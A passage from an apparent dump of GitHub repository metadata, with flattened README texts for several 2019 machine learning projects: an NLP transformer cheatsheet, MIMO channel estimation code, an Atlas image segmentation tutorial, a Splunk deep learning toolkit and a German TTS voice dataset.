Transformer Encoder Masked Self Attention Transformer Decoder Advantage Context on both sides Auto Regression Pretraining Bidirectional LM better Unidirectional LM Examples BERT GPT GPT 2 Applications Clasification Text generation Notes Auto Regression is when the final output token becomes input Original transformer combines both encoder and decoder is the only transformer doing this Transformer XL is a recurrent transformer decoder XLNet has both Context on both sides and Auto Regression ALL Transformers https github com thunlp PLMpapers models img models jpg Huggingface transformers https github com huggingface transformers Is a package with pretrained transformers models PyTorch Tensorflow Check their paper https arxiv org abs 1910 03771 Model Creator Date Breif description 1st Transfor https arxiv org abs 1706 03762 Google Jun 2017 Transforer encoder decoder ULMFiT https arxiv org abs 1801 06146 Fast ai Jan 2018 Regular LSTM ELMo https arxiv org abs 1802 05365 AllenNLP Feb 2018 Bidirectional LSTM GPT OpenAI Jun 2018 Transformer decoder on LM BERT https arxiv org abs 1810 04805 Google Oct 2018 Transformer encoder on MLM NSP TransformerXL https arxiv org abs 1901 02860 Google Jan 2019 Recurrent transformer decoder XLM mBERT https arxiv org abs 1901 07291 Facebook Jan 2019 Multilingual LM Transf ELMo AllenNLP Jan 2019 GPT 2 OpenAI Feb 2019 Good text generation ERNIE https arxiv org abs 1904 09223 Baidu Apr 2019 ERNIE https arxiv org abs 1905 07129 Tsinghua May 2019 Transformer with Knowledge Graph XLNet https arxiv org abs 1906 08237 Google Jun 2019 BERT Transformer XL RoBERTa https arxiv org abs 1907 11692 Facebook Jul 2019 BERT without NSP DistilBERT Hug Face Aug 2019 Compressed BERT MiniBERT https arxiv org abs 1909 00100 Google Aug 2019 Compressed BERT MultiFiT https arxiv org abs 1909 04761 Fast ai Sep 2019 Multi lingual ULMFiT MegatronLM https arxiv org abs 1909 08053 Nvidia Sep 2019 Big models with parallel training ALBERT https openreview net pdf id H1eA7AEtvS Google Sep 2019 Parameter reduction on BERT CTRL https arxiv org abs 1909 05858 Salesforce Sep 2019 Controllable text generation DistilGPT 2 Hug Face Oct 2019 Compressed GPT 2 Model 2L 3L 6L 12L 18L 24L 36L 48L 54L 72L 1st Transformer yes ULMFiT yes ELMo yes GPT 110M BERT 110M 340M Transformer XL 257M XLM mBERT Yes Yes Transf ELMo GPT 2 117M 345M 762M 1542M ERNIE Yes XLNet 110M 340M RoBERTa 125M 355M MegatronLM 355M 2500M 8300M DistilBERT 66M MiniBERT Yes ALBERT CTRL 1630M DistilGPT 2 82M Attention Aug 2015 Allows the network to refer back to the input sequence instead of forcing it to encode all information into ane fixed lenght vector Paper Effective Approaches to Attention based Neural Machine Translation https arxiv org abs 1508 04025 blog https jalammar github io visualizing neural machine translation mechanics of seq2seq models with attention attention and memory http www wildml com 2016 01 attention and memory in deep learning and nlp 1st Transformer Google AI jun 2017 Introduces the transformer architecture Encoder with self attention and decoder with attention Surpassed RNN s State of the Art Paper Attention Is All You Need https arxiv org abs 1706 03762 blog https jalammar github io illustrated transformer ULMFiT Fast ai Jan 2018 Regular LSTM Encoder Decoder architecture with no attention Introduces the idea of transfer learning in NLP 1 Take a trained tanguge model Predict wich word comes next Trained with Wikipedia corpus for example Wikitext 103 2 Retrain it with your corpus data 3 Train your task classification etc Paper Universal Language Model Fine tuning for Text Classification https arxiv org abs 1801 06146 ELMo AllenNLP Feb 2018 Context aware embedding better representation Useful for synonyms Made with bidirectional LSTMs trained on a language modeling LM objective Parameters 94 millions Paper Deep contextualized word representations https arxiv org abs 1802 05365 site https allennlp org elmo GPT OpenAI Jun 2018 Made with transformer trained on a language modeling LM objective Same as transformer but with transfer learning for ther NLP tasks First train the decoder for language modelling with unsupervised text and then train other NLP task Parameters 110 millions Paper Improving Language Understanding by Generative Pre Training https s3 us west 2 amazonaws com openai assets research covers language unsupervised languageunderstandingpaper pdf site https blog openai com language unsupervised code https github com openai finetune transformer lm BERT Google AI oct 2018 Bi directional training of transformer Replaces language modeling objective with masked language modeling Words in a sentence are randomly erased and replaced with a special token masked Then a transformer is used to generate a prediction for the masked word based on the unmasked words surrounding it both to the left and right Parameters BERT Base 110 millions BERT Large 340 millions Paper BERT Pre training of Deep Bidirectional Transformers for Language Understanding https arxiv org abs 1810 04805 Official code https github com google research bert blog http jalammar github io illustrated bert fastai alumn blog https medium com huggingface multi label text classification using bert the mighty transformer 69714fa3fb3d blog3 http mlexplained com 2019 01 07 paper dissected bert pre training of deep bidirectional transformers for language understanding explained slides https nlp stanford edu seminar details jdevlin pdf Transformer XL Google CMU Jan 2019 Learning long term dependencies Resolved Transformer s Context Fragmentation Outperforms BERT in LM Paper Transformer XL Attentive Language Models Beyond a Fixed Length Context https arxiv org abs 1901 02860 blog https medium com dair ai a light introduction to transformer xl be5737feb13 google blog https ai googleblog com 2019 01 transformer xl unleashing potential of html code https github com kimiyoung transformer xl XLM mBERT Facebook Jan 2019 Multilingual Language Model 100 languages SOTA on cross lingual classification and machine translation Parameters 665 millions Paper Cross lingual Language Model Pretraining https arxiv org abs 1901 07291 code https github com facebookresearch XLM blog https towardsdatascience com xlm enhancing bert for cross lingual language model 5aeed9e6f14b Transformer ELMo AllenNLP Jan 2019 Parameters 465 millions GPT 2 OpenAI Feb 2019 Zero Shot task learning Coherent paragraphs of generated text Parameters 1500 millions Site https blog openai com better language models Paper Language Models are Unsupervised Multitask Learners https d4mucfpksywv cloudfront net better language models languagemodelsareunsupervisedmultitasklearners pdf ERNIE Baidu research Apr 2019 World aware Structure aware and Semantic aware tasks Continual pre training Paper ERNIE Enhanced Representation through Knowledge Integration https arxiv org abs 1904 09223 XLNet Google CMU Jun 2019 Auto Regressive methods for LM Best both BERT Transformer XL Parameters 340 millions Paper XLNet Generalized Autoregressive Pretraining for Language Understanding https arxiv org abs 1906 08237 code https github com zihangdai xlnet RoBERTa Facebook Jul 2019 Facebook s improvement over BERT Optimized BERT s training process and hyperparameters Parameters RoBERTa Base 125 millions RoBERTa Large 355 millions Trained on 160GB of text Paper RoBERTa A Robustly Optimized BERT Pretraining Approach https arxiv org abs 1907 11692 Transformer architecture Transformer input 1 Tokenizer Create subword tokens Methods BPE 2 Embedding Create vectors for each token Sum of Token Embedding Positional Encoding Information about tokens order e g sinusoidal function 3 Dropout Transformer blocks 6 12 24 1 Normalization 2 Multi head attention layer with a left to right attention mask Each attention head uses self attention to process each token input conditioned on the other input tokens Left to right attention mask ensures that only attends to the positions that precede it to the left 3 Normalization 4 Feed forward layers 1 Linear H4H 2 GeLU activation func 3 Linear 4HH Transformer output 1 Normalization 2 Output embedding 3 Softmax 4 Label smothing Ground truth 90 the correct word and the rest 10 divided on the other words Lowest layers morphology Middle layers syntax Highest layers Task specific semantics Transfer Learning Step Task Data Who do this 1 Language Model Pretraining Lot of text corpus eg Wikipedia Google or Facebook 2 Language Model Finetunning Only you domain text corpus You 3 Your supervised task You labeled domain text You Losses Language modeling we project the hidden state on the word embedding matrix to get logits and apply a cross entropy loss on the portion of the target corresponding to the gold reply Next sentence prediction we pass the hidden state of the last token the end of sequence token through a linear layer to get a score and apply a cross entropy loss to classify correctly a gold answer among distractors Metrics Score For what Description Interpretation Perplexity LM The lower the better GLUE NLU An avergae of different scores BLEU Translation Compare generated with reference sentences N gram The higher the better BLEU limitation He ate the apple He ate the potato has the same BLEU score BLEU at your own risk https towardsdatascience com evaluating text output in nlp bleu at your own risk e8609665a213 Applications Application Description Type Part of speech tagging POS Identify nouns verbs adjectives etc aka Parsing Named entity recognition NER Identify names organizations locations medical codes etc Coreference Resolution Identify several ocuurences on the same person objet like he she Text categorization Identify topics present in a text sports politics etc Question answering Answer questions of a given text SQuAD DROP dataset Sentiment analysis Possitive or negative comment review classification Language Modeling LM Predict the next word Unupervised Masked Language Modeling MLM Predict the omitted words Unupervised Summarization Crate a short version of a text Translation Translate into a different language Chatbot Interact in a conversation Speech recognition Speech to text See AUDIO AUDIO md cheatsheet Speech generation Text to speech See AUDIO AUDIO md cheatsheet Natural Language Processing NLP Natural Language Understanding NLU Speech and sound speak and listen Translation Summarization Chatbot Huggingface SotA chatbot https medium com huggingface how to build a state of the art conversational ai with transfer learning 2d818ac26313 Model backbone Transformer decoder like GPT or GPT2 pretrained for LM Input data 1 Persona One or several personality sentences BLUE 2 History The history of the dialog PINK 3 Reply The tokens of the current answer GREEN img chatbot1 png Embeddings Word embedding Information about word semantics Position embedding Information about word order Segment embedding nformation about type personality history or reply img chatbot2 png Double Heads Model for multi task loss One head for language modeling loss Other head for next sentence classification loss img chatbot3 png References TO DO read Read NLP Recent Trends https medium com dair ai deep learning for nlp an overview of recent trends d0d8f40a776d August 2019 Read MASS https www microsoft com en us research blog introducing mass a pre training method that outperforms bert and gpt in sequence to sequence language generation tasks transfer learning in translation f,2019-09-29T11:26:39Z,2019-12-05T10:32:15Z,n/a,javiabellan,User,1,4,1,47,master,javiabellan,1,0,0,0,0,0,0
YuZhang-GitHub,1-Bit-ADCs,n/a,Deep Learning for Massive MIMO with 1 Bit ADCs When More Antennas Need Fewer Pilots This is the MATLAB codes related to the following article Yu Zhang Muhammad Alrabeiah and Ahmed Alkhateeb Deep Learning for Massive MIMO with 1 Bit ADCs When More Antennas Need Fewer Pilots https arxiv org abs 1910 06960 arXiv e prints p arXiv 1910 06960 Oct 2019 Abstract of the Article This paper considers uplink massive MIMO systems with 1 bit analog to digital converters ADCs and develops a deep learning based channel estimation framework In this framework the prior channel estimation observations and deep neural network models are leveraged to learn the non trivial mapping from quantized received measurements to channels For that we derive the sufficient length and structure of the pilot sequence to guarantee the existence of this mapping function This leads to the interesting and counter intuitive observation that when more antennas are employed by the massive MIMO base station our proposed deep learning approach achieves better channel estimation performance for the same pilot sequence length Equivalently for the same channel estimation performance this means that when more antennas are employed fewer pilots are required This observation is also analytically proved for some special channel models Simulation results confirm our observations and show that more antennas lead to better channel estimation both in terms of the normalized mean squared error and the achievable signal to noise ratio per antenna How to regenerate Figure 3 in this https arxiv org abs 1910 06960 paper 1 Download all the files of this repository 2 Create two empty folders at the same directory as the downloaded codes and name them Networks and Data respectively As the names indicate Networks will store the trained neural networks and Data will store the predicted channels for evaluations 3 Run main m in MATLAB 4 When main m finishes execute Fig3Generator m which will give Figure 3 shown below as result Figure3 https github com YuZhang GitHub 1 Bit ADCs blob master SNR png If you have any problems with generating the figure please contact Yu Zhang https www linkedin com in yu zhang 391275181 License and Referencing This code package is licensed under a Creative Commons Attribution NonCommercial ShareAlike 4 0 International License https creativecommons org licenses by nc sa 4 0 If you in any way use this code for research that results in publications please cite our original article Y Zhang M Alrabeiah and A Alkhateeb Deep Learning for Massive MIMO with 1 Bit ADCs When More Antennas Need Fewer Pilots https arxiv org abs 1910 06960 arXiv e prints p arXiv 1910 06960 Oct 2019,2019-10-13T05:29:18Z,2019-11-03T13:52:20Z,MATLAB,YuZhang-GitHub,User,3,4,2,39,master,YuZhang-GitHub#yuzhangmatrix,2,0,0,0,0,0,0
drcut,CPD,n/a,CPD A High Performance System for Customized Precision Distributed DL CPD is a state of art system which enables the researchers to use arbirtary precision s floating point with exp 8bits man 23bits as we use IEEE FP32 floating point to simulate customized precision floating point on Pytorch CPD can support the following operation Cast precision from IEEE FP32 to customized precision and vice versa Using customized precision floating point as accumulator while GEMM operation Using customized precision floating point as mid result while do all reduce operation Using Kahan accumulation algorithm while accumulation Note Besides customized precision we also implement a high performance general GEMM function for CUDA as we noticed there isn t an open source GEMM implemention which are high performance for general case with random M N and K except cuTLASS which are too complex to modify Researchers can use them with IEEE single floating points Installation requirements Python 3 6 PyTorch 0 4 1 Install CPD is quite easy just link the CPDtorch file with your project bash ln s PATHofthisrepo CPDtorch PATHofyourproject CPDtorch Examples We use our large batch low precision experiment s code as example Distributed Low Precision examples https github com drcut customizedprecisiontest Acknowledgement We learned a lot from the following projects when building CPD QPyTorch https github com Tiiiger QPyTorch We use the same logic for intergrate our work with Pytorch Team Ruobing Han Yang You https people eecs berkeley edu youyang James Demmel https people eecs berkeley edu demmel,2019-10-08T06:07:18Z,2019-12-02T13:26:12Z,Cuda,drcut,User,2,4,0,0,master,,0,0,0,0,0,0,0
dessa-public,Image-segmentation-tutorial,n/a,Foundations Atlas Tutorial Start Guide Cloud option If you have an AWS account try using our Atlas CE AMI publicly available Amazon Machine Image for Atlas The AMI will start by automatically installing the latest version of Atlas CE on a conda environment as well as starting the atlas server and downloading this tutorial cd atlastutorials Image segmentation tutorial and you can directly skip to Image Segmentation section The AMI supports both GPU and CPU instances Local option Prerequisites 1 Docker version 18 09 Docker installation Mac Windows 2 Python 3 6 Anaconda installation 3 5GB of free machine storage 4 The atlasceinstaller py file sign up and DOWNLOAD HERE Steps See Atlas documentation FAQ How to upgrade an older version of Atlas 1 Stop atlas server using atlas server stop 2 Remove docker images related to Atlas in your terminal docker images grep atlas ce awk print 3 xargs docker rmi f 3 Remove the environment where you installed the Atlas or pip uninstall the Atlas conda env remove n yourenvname Image Segmentation This tutorial demonstrates how to make use of the features of Foundations Atlas Note that any machine learning job can be run in Atlas without modification However with minimal changes to the code we can take advantage of Atlas features that will enable us to view artifacts such as plots and tensorboard logs alongside model performance metrics launch many training jobs at once organize model experiments more systematically Data and Problem The dataset that will be used for this tutorial is the Oxford IIIT Pet Dataset created by Parkhi et al The dataset consists of images their corresponding labels and pixel wise masks The masks are basically labels for each pixel Each pixel is given one of three categories Class 1 Pixel belonging to the pet Class 2 Pixel bordering the pet Class 3 None of the above Surrounding pixel If you have already cloned this repo download the processed data here https dl shareable s3 amazonaws com traindata npz Paste the downloaded file named traindata npz under the data directory of Image segmentation tutorial project Otherwise follow the instructions under Clone the Tutorial U Net Model The model being used here is a modified U Net A U Net consists of an encoder downsampler and decoder upsampler In order to learn robust features and reduce the number of trainable parameters a pretrained model can be used as the encoder Thus the encoder for this task will be a pretrained MobileNetV2 model whose intermediate outputs will be used and the decoder will be the upsample block already implemented in TensorFlow Examples in the Pix2pix https github com tensorflow examples blob master tensorflowexamples models pix2pix pix2pix py tutorial The reason to output three channels is because there are three possible labels for each pixel Think of this as multi classification where each pixel is being classified into three classes As mentioned the encoder will be a pretrained MobileNetV2 model which is prepared and ready to use in tf keras applications https www tensorflow org versions r2 0 apidocs python tf keras applications The encoder consists of specific outputs from intermediate layers in the model Note that the encoder will not be trained during the training process In the following sections we will describe how to use this repository and train your own image segmentation ML model in just a few steps Clone the Tutorial Skip this if you are using the Atlas CE AMI Clone this repository by running bash git clone https github com dessa public Image segmentation tutorial git and then type cd Image segmentation tutorial in the terminal to make this your current directory Download the Data Make sure that traindata npz is under Image segmentation tutorial data otherwise run cd data wget https dl shareable s3 amazonaws com traindata npz cd Start Atlas Skip this if you are using the Atlas CE AMI Otherwise activate the conda environment in which Foundations Atlas is installed by running conda activate yourenv inside terminal Then if you are using a machine without a GPU run atlas server start in a new tab terminal otherwise run atlas server start g Validate that the GUI has been started by accessing it at http localhost 5555 projects If you are using cloud GUI should already be accessible at http 5555 projects instead Running a job Activate the environment in which you have Foundations Atlas installed if you are using the Atlas CE AMI it should already be activated then from inside the project directory Image segmentation tutorial run the following command python foundations submit scheduler code main py Notice that you didn t need to install any other packages to run your job because Foundations already take care of it This is ensured by the fact that you have a requirements txt file in your main directory that specifies the python packages needed by your project Foundations Atlas makes use of that file to install your requirements before executing your codebase If you take a look at Atlas dashboard you can see basic information about the ran job such as start time its status or its job ID You can also check the logs of your job by clicking the expand button on the right end of the job row of each job Congrats Your code is now tracked by Foundations Atlas Let s move on to explore the magic of Atlas Atlas Features The Atlas features include 1 Experiment reproducibility 2 Various jobs status monitoring i e running killed etc from GUI 3 Job metrics and hyperparameters analysis in the GUI 4 Saving and viewing of any artifacts such as images audio or video from the GUI 5 Automatic job scheduling 6 Live logs for any running jobs and saved logs for finished or failed jobs are accessible from the GUI 7 Hyperparameter search 8 Tensorboard integration to analyze deep learning models 9 Running jobs in docker containers How to Enable Full Atlas Features Inside the code directory you are provided with the following python scripts main py a main script which prepares data trains an U net model then evaluates the model on the test set To enable Atlas features we only to need to make a few changes Let s start by importing foundations to the beginning of main py where we will make most of our changes python import foundations Logging Metrics and Parameters When training machine learning models it is always good practice to keep a record of the different architectures and parameters that were tried Some example parameters are the number of layers number of neurones per layer dataset used or other parameters specific to the experiment To do that Atlas enables any job parameters to be logged in the GUI using foundations logparams which accepts key value pairs Look for the comment python TODO Add foundations logparams hyperparams replace this with python foundations logparams hyperparams Here hyperparams is a dictionary in which keys are parameter names and values are parameter values In addition to keeping track of an experiment parameters it is also good practice to record the outcome of such experiment typically called metrics Some example metrics can be Accuracy Precision or other scores useful for the analysis of the problem In our case the last line of main py outputs the training and validation accuracy After these statements we will call the function foundations logmetric This function takes two arguments a key and a value After the function call has been added once a job successfully completes logged metrics for each job will be visible from the Foundations GUI Copy the following line and replace the print statement with it Look for the comment python TODO Add foundations logmetrics here replace this line with the lines below python foundations logmetric trainaccuracy float trainacc foundations logmetric valaccuracy float valacc Saving Artifacts We want to monitor the progress of our model while training by looking at the predicted masks for a given training image With Atlas we can save any artifact such as images audio video or any other files to the GUI with just one line It is worth noting that in order to save artifact to Atlas dashboard the artifact needs to be saved on disk first The path of the file on disk is then used to log such artifacts to the GUI Look for the comment python TODO Add foundations artifact i e foundations saveartifact f samplename png key f samplename and replace it with python foundations saveartifact f samplename png key f samplename Moreover you can save the trained model checkpoint files as an artifact Look for the comment python TODO Add foundations saveartifacts here to save the trained model and replace it with python foundations saveartifact trainedmodel h5 key trainedmodel This will allow you to download the trained model corresponding to any experiment directly from GUI TensorBoard Integration TensorBoard is a super powerful model visualization tool that makes the analysis of your training very easy Luckily Foundations Atlas has full TensorBoard integration and only requires from the user to point to the folder where the user is saving his tensorboard files python Add tensorboard dir for foundations here i e foundations settensorboardlogdir tflogs Replace this line with python foundations settensorboardlogdir tflogs to access TensorBoard directly from the Atlas GUI Run Foundations Atlas Congrats Now you enabled full Atlas features in your code Now run the same command as you ran previously i e foundations submit scheduler code main py from the Image segmentaion tutorial directory This time the job that we ran holds a set of parameters used in the experiment as well as the metrics representing the outcome of the experiment More details about the job can be accessed via the expansion icon to the right of the row The detail window includes job logs as well as the artifacts saved along the experiment It is also possible to add tags using the detail window to mark specific jobs On another level one can also select a job row for the jobs table in the GUI and send to tensorboard to benefit from all the features avaiable in TB It is usually a smart idea to do an in depth analysis of models to understand where they fail Please note that jobs for which tensorboard files where tracked by Atlas are marked with a tensorboard tag Code Reproducibility You can recover your code for any job at any time later in the future In order to recover the code corresponding to any Foundations Atlas jobid just execute bash foundations get job scheduler which will recover your experiment s bundle from the job store You can access the jobid of individual experiments via the GUI Optional Build Docker Image In previous runs Foundations Atlas used to install the libraries inside requirements txt everytime before executing the user s codebase To avoid having such overhead at every new job one might build a custom docker image that Foundations Atlas will use to run the experiments Run the following command in the terminal bash cd customdockerimage nvidia docker build tag imageseg atlas Since customerdockerimage folder already contains a DockerFile that would build a docker image that support both Foundations Atlas and the requirements of the project you have created a docker image named imageseg atlas on your local computer that contains the python environment required to run this job Running with the Built Docker Image Configuration In Atlas it is possible to create a configuration job in your working directory that specifies some base information about all jobs you want to run Such information can be the project name defaults to directory name when non existent the level of log to receive number of GPUs to use per job or the docker image to use for every job Below is an example of configuration file that you can use for this project First create a file named job config yaml inside code directory and copy the text from below into the file We will also make use of the docker image we have already built imageseg atlas yaml Project config projectname Image segmentation tutorial loglevel INFO Worker config Additional definition for the worker can be found here https docker py readthedocs io en stable containers html numgpus 0 worker image imageseg atlas name of your customized images volumes local path to folder containing data bind data mode rw Note If you don t want to use the custom docker image you can just comment out or just delete the whole image line inside worker section of this config file shown above Make sure to give right path of your data folder as shown below Under the volumes section you will need to replace absolute path to folder containing data with your host absolute path of data folder so that your data volume is mounted inside the Foundations Atlas docker container In order to obtain your absolute data path you can cd data and then run pwd in the terminal Data Directory Since we will mount our data folder from the host to the container we need to change the data path appropriately inside our codebase python traindata np load data traindata npz allowpickle True Replace the above block where the traindata npz is loaded with the line below python traindata np load data traindata npz allowpickle True More details of how it will work inside Foundations Atlas are provided under the Configuration section above in this document Run with full features of Foundations Atlas Go inside the code directory and run the command below in your terminal make sure you are in the foundations enviornment python foundations submit scheduler main py This time we are running the main py from inside the code directory In this way Foundations Atlas will only package the code folder and the data folder will get mounted directly inside Foundations Atlas docker container as we specified inside the configuration file above In this way the data will not be a part of job package making it much faster and memory efficient At any point to clear the queue of submitted jobs python foundations clear queue scheduler How to Improve the Accuracy After running your most recent job you can see that the validation accuracy is not very impressive The predicted artifacts don t look similar to the true masks either Debugging with Tensorboard Let s analyze the gradients using Tensorboard to understand what is happening with this sub par model First click on the checkbox for your most recent job and press Send to Tensorboard button This should open a new tab with Tensorboard up and running Find the histograms http localhost 5959 histograms tab There you will see gradient plots such as below where the first upsample layer has a range of gradients between 0 4 and 0 4 Final upsample layer Previous layers First upsample layer images grad4 png images grad3 png images grad2 png images grad0 png As it is apparent from the plots the gradients for the first upsample layer are small and centered around zero To prevent vanishing of gradients in the earlier layers you can try modifying the code appropriately Feel free to check the hints with,2019-10-01T14:59:45Z,2019-10-24T21:48:26Z,Python,dessa-public,Organization,4,4,1,76,master,gozepolat#josjsjen#ranasac19878#marctyndel#rthurair,5,0,0,2,0,1,0
StateOfTheArt-quant,transformerquant,n/a,transformerquant transformerquant is an open source framework for training and evaluating deep learning models in quantitative trading domain It provides simple and extensible interfaces and abstractions for model components contains workflows to train popular deep learning algorithms including data preprocessing feature transformation distributed training evaluation and model serving transformerquant provides state of the art general purpose deep learning architectures to help researcher explore and expand the boundary of predictability in quantitative trading domain More specifically this framework is trying to transfer state of the art model architectures from Computer Vision CV Nature Language Processing NLP and other domains to quantitative finance domain Besides we are trying to build some pretrained models to help research improve downstream tasks performance by simply fine tuning all pre trained parameters Algorithms Supported 1 SSA MILA 2017 A structured self attentive sentence embedding https arxiv org abs 1703 03130 2 Transformer Google 2017 Attention Is All You Need https arxiv org abs 1706 03762 3 BERT Google 2019 BERT Pre training of Deep Bidirectional Transformers for Language Understanding https arxiv org abs 1810 04805 Install Dependencies featurizer https github com StateOfTheArt quant featurizer A define by run framework for data feature engineering pytorch https github com pytorch pytorch the most popular deep learning framework for model training and evaluating with strong GPU acceleration Install from source git clone https github com StateOfTheArt quant transformerquant git cd featurizer python setup py install Quick start Author Allen Yu allen across gmail com License This project following Apache 2 0 License as written in LICENSE file Copyright 2018 Allen Yu StateOfTheArt quant Lab respective Transformer contributors,2019-10-14T02:48:28Z,2019-11-15T14:04:16Z,Python,StateOfTheArt-quant,Organization,0,4,0,7,master,walkacross,1,0,0,0,0,0,0
simshineaicamera,magic,caffe-ssd#magic-tool#simcam,Magic The project designed for simplifying training process as much as possible We have used SOTA tracking and object detection models for automatic labeling Environments 1 Ubuntu 16 04 18 04 2 python 3 6 3 opencv 3 4 4 pyqt5 5 caffe ssd gpu version preferably Installation 1 Load the source of Magic project Shell git lfs clone https github com simshineaicamera magic git cd magic Note please use git lfs because yolov3 model is large can t be downloaded without git lfs 2 Install python package requirments Shell python3 6 m pip install r requirments txt 3 If you have already installed SIMCAMSDK https github com simshineaicamera SIMCAMSDK you can skip this step Compile caffe ssd https github com weiliu89 caffe tree ssd on your system and set PYTHONPATH into your system path Installation with Docker 1 The most easiest way to install the tool is using docker Run following commands to upload and run the docker image Shell sudo docker run it v tmp X11 unix tmp X11 unix e DISPLAY DISPLAY privileged simcam magic v1 0 bash cd home Magic How to use 1 Run the run sh script Shell run sh You will see GUI for auto labeling and training your own model ui main window imgs main jpg Magic UI 2 Let s say you are going train your own cat detection model press Upload Video button to upload a video and please make sure that video contains desired object in this case cat 3 Choose object name Note you can choose Other class as well and give a label for the object for example mycat In this option the program use tracking method for automatic labeling 4 Press Generate Data button to generate data for training 5 Data generating process takes 10 15 mins depends on your system CPU and GPU capability After generating data you will see message as below ui main window imgs gendata jpg Magic UI 6 Press Train Model button to start training the model Training speed depends on your system capability CPU and GPU You can see training process on the screen epoch and accuracy ui main window imgs processw jpg Magic UI You can stop training process early if you think accuracy of the model is enough From the experiments if model accuracy is higher than 0 86 value you can test the model for deploy References 1 Caffe SSD https github com weiliu89 caffe tree ssd 2 MobileNet SSD https github com chuanqi305 MobileNet SSD 3 SiamMask https github com foolwood SiamMask 4 MobileNet YOLO https github com eric612 MobileNet YOLO 5 Yolov3 https github com heartkilla yolo v3,2019-10-15T06:00:50Z,2019-12-10T09:35:13Z,Python,simshineaicamera,Organization,0,4,0,0,master,,0,0,0,0,0,0,0
ambuj501,Time-Series-Forcasting,n/a,Time Series Forcasting,2019-09-30T10:47:20Z,2019-12-09T08:38:55Z,Jupyter Notebook,ambuj501,User,1,4,0,5,master,ambuj501#kksvmic,2,0,0,0,0,0,0
hellodanylo,ucla-deeplearning,n/a,Advanced Workshop on Machine Learning https ccle ucla edu course view 19F MGMTMSA434 1 showall 1 This is the official repository with course material for UCLA Advanced Workshop on Machine Learning MGMTMSA 434 The repository will be updated as the course progresses The course consists of 5 module 1 Deep Neural Networks 2 Convolutional Neural Networks 3 Recurrent Neural Networks 4 Generative Adversarial Networks 5 Ensemble Methods Copyright Danylo Vashchilenko 2019,2019-09-25T19:09:48Z,2019-10-30T21:21:29Z,Jupyter Notebook,hellodanylo,User,2,3,5,61,master,hellodanylo,1,0,0,0,0,0,15
Paperspace,FaceApp-with-Deep-Learning,n/a,FaceApp with Deep Learning Compatible with Tensorflow 1 14 Corresponding article https blog paperspace com use cyclegan age conversion keras python,2019-10-25T15:34:36Z,2019-12-10T19:06:01Z,Jupyter Notebook,Paperspace,Organization,7,3,2,11,master,Anil-matcha#dkobran,2,0,0,0,0,0,0
splunk,splunk-mltk-container-docker,n/a,Deep Learning Toolkit for Splunk Deep Learning Toolkit for Splunk version 2 3 0 Copyright C 2005 2019 Splunk Inc All rights reserved Author Philipp Drieger MLTK Container This repository contains the container endpoint app jupyter notebook configuration config and examples notebooks build scripts and the main Dockerfile to create the existing pre built container images https hub docker com u phdrieger for TensorFlow 2 0 CPU and GPU PyTorch CPU and GPU NLP libraries Rebuild You can rebuild your own containers with the build sh script Examples Build TensorFlow CPU image for your own docker repo build sh tf cpu yourlocaldockerrepo Build TensorFlow GPU image for your own docker repo build sh tf gpu yourlocaldockerrepo Build PyTorch image for your own docker repo build sh pytorch yourlocaldockerrepo Build NLP image for your own docker repo build sh nlp yourlocaldockerrepo If you decide to modify to yourlocaldockerrepo you need to update your images conf in the Deep Learning Toolkit app go to your SPLUNKHOME etc apps mltk container local images conf and add your own image stanzas Have a look at SPLUNKHOME etc apps mltk container default images conf to see how the stanzas are defined Build your own custom container images Feel free to extend the build script and Dockerfile to create your own custom MLTK Container images To make your own images available in the Deep Learning Toolkit app please add a local config file to the app go to your SPLUNKHOME etc apps mltk container local images conf and add for example your new stanza myimage title My custom image image mltk container myimage repo yourlocaldockerrepo runtime none nvidia Further documentation and usage Please find further information and documentation contained in the Deep Learning Toolkit app in the overview section Download and install the Deep Learning Toolkit https splunkbase splunk com app 4607,2019-09-27T13:34:36Z,2019-12-10T14:28:48Z,Jupyter Notebook,splunk,Organization,16,3,4,8,master,pdrieger,1,0,0,0,1,0,0
thorstenMueller,deep-learning-german-tts,n/a,english version below Introduction Einleitung Viele aktuell so angesagte smarte Assistenten wie Amazon Alexa Google Home Apple Siri und Microsoft Cortana bentigen zwingend eine Internetverbindung um u a die Funktionen STT Sprache in Text und TTS Text in Sprache in ordentlicher Qualitt anzubieten Es gibt aber auch Open Source Projekte die alternative Assistenten entwickeln die teils offline funktionieren Fr den Bereich STT TTS werden dazu jedoch gute Trainings Testdaten bspw zum Deep Learning bentigt Hier kommt das Projekt Mozilla Common Voice ins Spiel Und Ich mchte meinen kleinen bescheidenen Beitrag leisten und stelle meine Stimme unter der CC0 Lizenz zur Verfgung Die notwendigen Stze entstammen dem Mozilla Common Voice Projekt und die Aufzeichnung der Stimme habe ich mit Mimic Recording Studio von MyCroft vorgenommen Klingt gut Was genau gibt es hier Der Corpus als CSV Format so dass er vom Mimic Recording Studio verwendet werden kann Datenquelle Mozilla commion voice anteilig Die LJSpeech 1 1 Struktur metadata csv und zugehrige WAV Dateien zur Verarbeitung mit mimic2 basiert auf Tacotron Aufgrund von Github Grenbeschrnkung liegen die gezippten WAV Dateien im Google Drive Download Link https drive google com drive folders 12wihZ6X7OYf4 7GG4b o f5RaNNPKsqA usp sharing Aktueller Stand Aufnahmen 3 000 von 20 000 Stzen mit einer gesprochenen Lnge von 5 Stunden 10 Minuten und einer Sprechgeschwindgkeit von ca 12 13 Zeichen pro Sekunde Sonstiges Bitte verwende es nicht fr Bses Solltest Du meine konkrete TTS Stimme verwenden wre ich fr eine Info zum Projekt und eine Demo dankbar Auerdem gilt mein Dank an die Projekte Communities von Mozilla Common Voice und MyCroft Mimic Besonds an Lindsay Saunders Mozilla fr den netten Kontakt und eltocino gras64 dominik von der MyCroft Community fr die Gedult meine Anfngerfragen gedultig zu beantworten Introduction Many currently so hip smart assistants like Amazon Alexa Google Home Apple Siri and Microsoft Cortana need an internet connection to offer the functions STT speech in text and TTS text in speech in decent quality But there are also open source projects that develop alternative wizards some of which work offline For the area STT TTS however good training test data eg for deep learning are required This is where the Mozilla Common Voice project comes into play And I want to make my small modest contribution and make my voice available under the CC0 license The necessary sentences came from the Mozilla Common Voice project and I recorded the voice with Mimic Recording Studio by MyCroft Sounds good What exactly is here The Corpus as a CSV format that can be used by the Mimic recording studio datasource is partial mozilla common voice project The LJSpeech 1 1 structure metadata csv and associated WAV files for processing with mimic2 based on Tacotron Due github size restrictions the compressed wav files can be downloaded from google drive Download Link https drive google com drive folders 12wihZ6X7OYf4 7GG4b o f5RaNNPKsqA usp sharing Current status Record 3 000 of 20 000 sentences with a spoken length of 5 hours 10 minutes and a speech speed of approximately 12 13 characters per second Miscellaneous Please do not use it for evil If you use my concrete TTS voice I would be grateful for an info about the project and a demo Also my thanks go to the projects 